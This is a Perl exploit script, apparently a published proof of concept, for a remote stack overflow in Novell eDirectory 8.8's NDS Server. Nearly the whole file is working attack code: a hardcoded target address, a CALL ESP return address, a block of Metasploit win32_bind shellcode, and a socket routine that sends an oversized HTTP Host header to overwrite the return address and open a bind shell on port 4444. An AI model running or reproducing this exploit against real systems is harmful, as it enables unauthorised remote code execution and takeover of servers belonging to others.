#!perl
#
# "Novell eDirectory 8.8 NDS Server" Remote Stack Overflow Exploit
#
# Author:  Manuel Santamarina Suarez
# e-Mail:  FistFuXXer@gmx.de
#

use IO::Socket;

#
# destination IP address
#
$ip = '192.168.1.25';

#
# destination TCP port
#
$port = 8028;

#
# RETurn address. 0x00, 0x0a, 0x0d, 0x3a free
#
$ret = reverse( "\x5F\x83\x3B\x7A" );  # CALL ESP
                                      # MFC42U.5f833b7a

#
# 0x00, 0x0a, 0x0d, 0x3a free shellcode
#
# win32_bind -  EXITFUNC=thread LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com
#
$sc = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
     "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".
     "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
     "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
     "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e".
     "\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x56\x4b\x38".
     "\x4e\x56\x46\x42\x46\x32\x4b\x58\x45\x44\x4e\x43\x4b\x48\x4e\x57".
     "\x45\x30\x4a\x37\x41\x50\x4f\x4e\x4b\x38\x4f\x44\x4a\x51\x4b\x48".
     "\x4f\x35\x42\x42\x41\x50\x4b\x4e\x49\x54\x4b\x48\x46\x43\x4b\x38".
     "\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x38\x42\x4c".
     "\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e".
     "\x46\x4f\x4b\x53\x46\x55\x46\x42\x4a\x42\x45\x57\x45\x4e\x4b\x48".
     "\x4f\x35\x46\x52\x41\x30\x4b\x4e\x48\x36\x4b\x58\x4e\x50\x4b\x54".
     "\x4b\x58\x4f\x45\x4e\x31\x41\x50\x4b\x4e\x43\x50\x4e\x52\x4b\x38".
     "\x49\x38\x4e\x46\x46\x42\x4e\x41\x41\x46\x43\x4c\x41\x53\x4b\x4d".
     "\x46\x36\x4b\x58\x43\x44\x42\x33\x4b\x48\x42\x44\x4e\x50\x4b\x58".
     "\x42\x47\x4e\x51\x4d\x4a\x4b\x58\x42\x54\x4a\x50\x50\x45\x4a\x36".
     "\x50\x38\x50\x54\x50\x50\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x46".
     "\x43\x35\x48\x56\x4a\x56\x43\x33\x44\x53\x4a\x46\x47\x57\x43\x47".
     "\x44\x53\x4f\x55\x46\x35\x4f\x4f\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e".
     "\x4e\x4f\x4b\x53\x42\x55\x4f\x4f\x48\x4d\x4f\x35\x49\x38\x45\x4e".
     "\x48\x56\x41\x48\x4d\x4e\x4a\x50\x44\x50\x45\x35\x4c\x46\x44\x30".
     "\x4f\x4f\x42\x4d\x4a\x56\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x45".
     "\x4f\x4f\x48\x4d\x43\x35\x43\x35\x43\x35\x43\x35\x43\x35\x43\x54".
     "\x43\x45\x43\x34\x43\x55\x4f\x4f\x42\x4d\x48\x46\x4a\x46\x41\x31".
     "\x4e\x45\x48\x36\x43\x45\x49\x58\x41\x4e\x45\x39\x4a\x36\x46\x4a".
     "\x4c\x41\x42\x37\x47\x4c\x47\x55\x4f\x4f\x48\x4d\x4c\x36\x42\x41".
     "\x41\x55\x45\x55\x4f\x4f\x42\x4d\x4a\x56\x46\x4a\x4d\x4a\x50\x42".
     "\x49\x4e\x47\x55\x4f\x4f\x48\x4d\x43\x45\x45\x35\x4f\x4f\x42\x4d".
     "\x4a\x46\x45\x4e\x49\x34\x48\x38\x49\x54\x47\x35\x4f\x4f\x48\x4d".
     "\x42\x55\x46\x55\x46\x45\x45\x45\x4f\x4f\x42\x4d\x43\x59\x4a\x36".
     "\x47\x4e\x49\x37\x48\x4c\x49\x57\x47\x55\x4f\x4f\x48\x4d\x45\x45".
     "\x4f\x4f\x42\x4d\x48\x36\x4c\x36\x46\x56\x48\x46\x4a\x56\x43\x36".
     "\x4d\x46\x49\x38\x45\x4e\x4c\x56\x42\x45\x49\x35\x49\x32\x4e\x4c".
     "\x49\x58\x47\x4e\x4c\x56\x46\x44\x49\x48\x44\x4e\x41\x53\x42\x4c".
     "\x43\x4f\x4c\x4a\x50\x4f\x44\x34\x4d\x52\x50\x4f\x44\x54\x4e\x52".
     "\x43\x59\x4d\x48\x4c\x37\x4a\x53\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36".
     "\x44\x47\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x57\x46\x44\x4f\x4f".
     "\x48\x4d\x4b\x55\x47\x55\x44\x35\x41\x55\x41\x35\x41\x55\x4c\x46".
     "\x41\x50\x41\x45\x41\x55\x45\x45\x41\x35\x4f\x4f\x42\x4d\x4a\x46".
     "\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x55\x4f\x4f\x48\x4d\x4c\x56".
     "\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x38\x47\x45\x4e\x4f".
     "\x43\x48\x46\x4c\x46\x56\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d".
     "\x4a\x36\x50\x57\x4a\x4d\x44\x4e\x43\x37\x43\x45\x4f\x4f\x48\x4d".
     "\x4f\x4f\x42\x4d\x5a";

print '"Novell eDirectory 8.8 NDS Server" Remote Stack Overflow Exploit'."\n\n";

$sock = IO::Socket::INET->new
(

   PeerAddr => $ip,
   PeerPort => $port,
   Proto    => 'tcp',
   Timeout  => 2

) or print '[-] Error: Could not establish a connection to the server!' and exit(1);

print "[+] Connected.\n";
print "[+] Trying to overwrite RETurn address...\n";

$sock->send( "GET /nds HTTP/1.1\r\n" );
$sock->send( 'Host: ' . 'SEXY' x 17 . $ret . $sc . "\r\n\r\n" );

print "[+] Done. Now check for bind shell on $ip:4444!";

close( $sock );

